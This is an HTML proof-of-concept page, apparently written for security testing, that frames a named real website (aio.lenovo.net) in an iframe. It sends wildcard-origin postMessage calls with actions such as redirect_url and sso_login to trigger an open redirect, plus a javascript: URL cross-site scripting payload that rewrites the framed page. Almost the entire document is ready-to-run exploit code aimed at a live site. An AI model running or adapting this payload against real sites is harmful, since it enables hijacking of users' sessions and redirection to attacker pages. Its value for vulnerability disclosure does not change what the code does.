<!doctype html>
<meta charset="utf-8">
<button onclick="testRedirect()">验证跳转</button>
<button onclick="testXss()">验证XSS</button>
<pre id="log"></pre>
<iframe id="v" src="https://aio.lenovo.net/" style="width:100%;height:700px"></iframe>

<script>
const f = document.getElementById('v');
const log = (m)=>document.getElementById('log').textContent += m + "\n";

function sendAll(url){
  ['redirect_url','sso_login','wake_up'].forEach(a=>{
    f.contentWindow.postMessage({action:a, url:url}, '*'); // 关键：*
    log('[send] ' + a + ' -> ' + url);
  });
}

function testRedirect(){
  sendAll('https://example.com/?t=' + Date.now());
}

function testXss(){
  sendAll('javascript:document.body.innerHTML="<h1 style=color:red>XSS:"+document.domain+"</h1>"');
}
</script>
